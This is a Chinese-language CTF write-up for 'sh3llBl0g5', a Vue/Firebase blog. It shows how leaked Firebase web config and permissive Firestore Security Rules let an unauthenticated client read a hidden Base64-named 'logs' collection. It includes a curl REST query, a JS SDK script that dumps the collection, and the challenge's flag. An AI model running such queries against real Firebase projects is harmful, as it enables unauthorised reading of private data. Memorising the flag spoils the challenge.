# sh3llBl0g5

## 题目简述

前端是 Vue + Firebase 的博客应用。比赛部署泄露了前端构建信息，其中能恢复 Firebase 项目标识以及一个不在正常界面展示的 Firestore 集合 `bG9ncw`；该集合的 Security Rules 又允许客户端直接读取。flag 是集合中的一条日志文档。决定性问题是云数据库资源策略失配，因此本题归入 Cloud/Infra，而不是普通 Web 路由漏洞。

## 解题过程

### 从客户端资源确定 Firebase 项目

Vue 应用在浏览器中初始化 Firebase：

```javascript
const firebaseConfig = {
  apiKey: process.env.VUE_APP_AKEY,
  authDomain: process.env.VUE_APP_ADOMAIN,
  projectId: process.env.VUE_APP_PID,
  storageBucket: process.env.VUE_APP_SBUCKET,
  messagingSenderId: process.env.VUE_APP_MSID,
  appId: process.env.VUE_APP_AID
};

initializeApp(firebaseConfig);
```

这些 Firebase Web 配置会进入客户端包；其中的 API key 用于标识项目，并不是能替代 Firestore 授权的服务器密钥。真正应保护数据的是 Firebase Authentication 与 Firestore Security Rules。

官方题解称比赛实例暴露了 Vue source map，可从 `.js.map` 的 `sourcesContent` 中恢复可读源码与配置。当前归档快照的 `vue.config.js` 已是：

```javascript
module.exports = defineConfig({
  transpileDependencies: true,
  productionSourceMap: false
})
```

所以重新构建当前快照不会复现那份 `.map`；这是归档与比赛部署之间的差异。即便没有 source map，Firebase Web 配置仍存在于打包后的 JavaScript，只是变量名和结构更难读。

### 找到隐藏集合

恢复的 Firebase 模块定义了三个引用：

```javascript
const colRef   = collection(db, 'bXl1c2Vyc2xpc3Q');
const blogsRef = collection(db, 'bXlibG9nc2xpc3Q');
const THERef   = collection(db, 'bG9ncw');
```

对集合名做 Base64 解码：

```python
import base64

for name in ["bXl1c2Vyc2xpc3Q", "bXlibG9nc2xpc3Q", "bG9ncw"]:
    print(name, "->", base64.b64decode(name + "===").decode())
```

结果为：

```text
bXl1c2Vyc2xpc3Q -> myuserslist
bXlibG9nc2xpc3Q -> myblogslist
bG9ncw           -> logs
```

前两个集合支撑正常博客功能，`logs` 才是刻意隐藏的目标。部署初始化脚本进一步证明：它把正常日志、随机用户名日志和 flag 文档混合后写入该集合，字段名统一为 `item`。

### 按“身份—动作—资源”验证错误授权

最小权限图为：

```text
未认证浏览器客户端
  -> Firestore documents.list / documents.get
  -> projects/<project>/databases/(default)/documents/bG9ncw
```

从打包资源取出 `projectId` 与 Web API key 后，可用 Firestore REST API 做一次只读查询：

```bash
curl -s \
  "https://firestore.googleapis.com/v1/projects/PROJECT_ID/databases/(default)/documents/bG9ncw?key=WEB_API_KEY"
```

若 Security Rules 正确拒绝未认证身份，应收到权限错误；比赛配置却返回 `documents`。在响应中读取每个 `fields.item.stringValue`，或使用 Firebase SDK：

```javascript
import { initializeApp } from "firebase/app";
import { collection, getDocs, getFirestore } from "firebase/firestore";

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);
const snapshot = await getDocs(collection(db, "bG9ncw"));

for (const document of snapshot.docs) {
  const value = document.data().item;
  if (value && value.startsWith("shellmates{")) {
    console.log(value);
  }
}
```

得到：

```text
shellmates{f1r3$70r3_rul35_m15c0nf1gur4t10n5_g035_brrrrrrr}
```

归档的 `config/firebase.json` 还包含部署初始化用的服务账号材料，但那不是比赛客户端解法所需证据，也不应复制到题解或用于扩大项目访问范围；公开 Web 配置加错误 Firestore Rules 已足以完成只读取证。

## 方法总结

Firebase Web API key 出现在前端不是漏洞，Firestore Rules 允许不该有权限的身份读取秘密集合才是漏洞。分析时应明确 `identity -> action -> resource`：先从前端确定 project 与集合，再对单一目标集合做最小只读验证，避免把“能看到项目配置”误写成“拿到管理员凭据”。归档中 source-map 开关与比赛部署不一致，也必须单独说明，不能声称当前源码重建后仍会泄露 `.map`。
